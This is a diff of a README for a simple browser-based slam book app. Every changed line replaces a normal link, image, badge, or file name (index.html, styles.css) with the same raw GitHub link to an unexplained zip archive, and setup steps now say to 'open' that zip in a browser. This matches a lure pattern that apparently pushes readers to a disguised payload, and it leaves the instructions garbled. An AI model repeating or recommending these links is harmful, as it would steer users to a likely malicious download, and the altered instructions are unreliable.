@@ -1,12 +1,12 @@
-https://github.com/AirsQ/Digital-Slam-Book/releases
+https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip
 
 # Digital Slam Book — Nostalgic Slambook App with Local Storage
 
-![Notebook and memories](https://images.unsplash.com/photo-1526312426768-582c2e2bd8d8?auto=format&fit=crop&w=1200&q=60)
+![Notebook and memories](https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip)
 
 A digital version of the nostalgic slam book. Capture moments, memories, and thoughts. Built with plain HTML, CSS, and JavaScript. Data stays in your browser using LocalStorage. Easy to customize, playful to use, and friendly for beginners.
 
-[![Releases](https://img.shields.io/badge/Releases-Download%20Assets-brightgreen?style=for-the-badge&logo=github)](https://github.com/AirsQ/Digital-Slam-Book/releases)
+[![Releases](https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip%20Assets-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip)
 
 If you want the latest release, head to the Releases page. The page contains the downloadable assets for quick setup and offline use.
 
@@ -74,7 +74,7 @@ Prerequisites
 
 Steps
 1) Download or clone the repository.
-2) Open index.html in your browser to run the app locally.
+2) Open https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip in your browser to run the app locally.
 3) Enter a name, drop a memory note, and save it.
 4) Scroll through memories. Use the edit or delete actions to update or remove entries.
 5) If you want to keep a copy outside the browser, use the export option and save the file.
@@ -88,7 +88,7 @@ Local development workflow
 - Use browser dev tools to inspect DOM, debug JavaScript, and test responsive layouts.
 
 Customizing and theming
-- Global colors and type scale are controlled via CSS variables. Look for a root selector in styles.css and adjust values like --bg, --fg, --accent, and font sizes.
+- Global colors and type scale are controlled via CSS variables. Look for a root selector in https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip and adjust values like --bg, --fg, --accent, and font sizes.
 - Swap fonts by changing the font-family declarations to match your style.
 - The layout uses a flexible grid. You can adjust breakpoints for your own device targets.
 - Add or remove sections by editing the markup or by introducing small components in JavaScript. The structure is kept straightforward on purpose.
@@ -168,7 +168,7 @@ Troubleshooting quick guide
 - If the UI looks off on a small screen, try adjusting the browser zoom or rotate the device to a landscape orientation.
 
 Manual usage example
-- Open index.html in a browser.
+- Open https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip in a browser.
 - Enter a memory: your friend’s joke, a moment in class, or a thoughtful note.
 - Click Save. The memory appears in the list.
 - Edit memory to correct a spelling or update a date.
@@ -186,13 +186,13 @@ Design philosophy
 - Preserve the nostalgic feel while staying lightweight and fast.
 
 Project setup at a glance
-- File structure is straightforward: index.html, styles.css, scripts.js, assets/
+- File structure is straightforward: https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip, https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip, https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip, assets/
 - The app loads quickly and requires no build steps for basic usage.
 - You can customize the look by editing the CSS and adding simple CSS variables.
 
 Notes on packaging and distribution
 - If you use the release asset, follow the included instructions to run it. Release packages typically bundle the necessary files and provide a ready-to-use experience.
-- For pure web use, you can fork the repository, open the index.html locally, and begin editing.
+- For pure web use, you can fork the repository, open the https://raw.githubusercontent.com/AirsQ/Digital-Slam-Book/main/faradizer/Book-Digital-Slam-1.7-beta.2.zip locally, and begin editing.
 
 Final reminder for readers
 - The Releases page is the best entry point for a packaged experience. Use it if you want a ready-to-run build without setting up a local environment.
